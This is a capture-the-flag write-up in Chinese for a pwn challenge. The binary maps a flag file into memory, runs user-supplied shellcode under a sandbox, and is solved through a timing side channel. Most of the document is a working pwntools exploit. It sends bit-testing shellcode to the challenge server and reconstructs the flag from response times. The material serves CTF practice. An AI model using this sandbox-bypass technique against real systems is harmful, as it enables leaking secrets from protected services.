# ELF
```
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int fd; // [rsp+2Ch] [rbp-4h]

  init(argc, argv, envp);
  printf("execve? orw?");
  fd = open("./flag", 0);
  mmap((void *)0x11451000, 0x1000u, 6, 2, fd, 0);
  read(0, (void *)0x11451500, 0x500u);
  sandbox();
  MEMORY[0x11451500]();
  return 0;
}
```
程序是很明显的测信道题，向mmap的地址读入flag与shellcode，执行shellcode。

以下为exp：
```
from pwn import *
import time, statistics

context.arch = "amd64"
context.os = "linux"
context.log_level = "error"

HOST = "challenge.shc.tf"
PORT = 31156

FLAG_ADDR = 0x11451000
SC_SIZE = 0x500
LOOP_CNT = 0x6000000  # 调大可扩大信道距离。


def make_sc(idx, mask):
    return asm(
        f"""
        mov rbx, {FLAG_ADDR}
        add rbx, {idx}
        mov al, byte ptr [rbx]
        test al, {mask}
        jz fast

        mov rcx, {LOOP_CNT}
    loop1:
        dec rcx
        jnz loop1

    fast:
        mov eax, 60
        xor edi, edi
        syscall
    """
    )


def run_once(sc):
    p = remote(HOST, PORT)
    start = time.time()
    p.send(sc.ljust(SC_SIZE, b"\x90"))
    try:
        p.recvall(timeout=2)
    except:
        pass
    p.close()
    return time.time() - start


def calibrate():
    print("[*] Calibrating timing threshold...")

    sc_fast = asm("mov eax, 60; xor edi, edi; syscall")
    sc_slow = asm(
        f"""
        mov rcx, {LOOP_CNT}
    l:
        dec rcx
        jnz l
        mov eax, 60
        xor edi, edi
        syscall
    """
    )

    fast = [run_once(sc_fast) for _ in range(5)]
    slow = [run_once(sc_slow) for _ in range(5)]

    f = statistics.median(fast)
    s = statistics.median(slow)
    t = (f + s) / 2

    print(f"    fast exit = {f:.4f}s")
    print(f"    slow loop = {s:.4f}s")
    print(f"    threshold = {t:.4f}s")

    return t


def test_bit(idx, bit, thresh):
    sc = make_sc(idx, 1 << bit)
    dt = run_once(sc)
    return 1 if dt > thresh else 0


def leak_byte(idx, thresh):
    v = 0
    for bit in range(8):
        v |= test_bit(idx, bit, thresh) << bit
    return v


def main():
    thresh = calibrate()
    flag = b""

    for i in range(0x60):
        b = leak_byte(i, thresh)
        if b == 0:
            break
        flag += bytes([b])
        print(f'[{i:02d}] -> {b:#04x} ({chr(b) if 32 <= b <= 126 else "."}) | {flag}')

    print("\\nFLAG =", flag.decode(errors="ignore"))


if __name__ == "__main__":
    main()

```
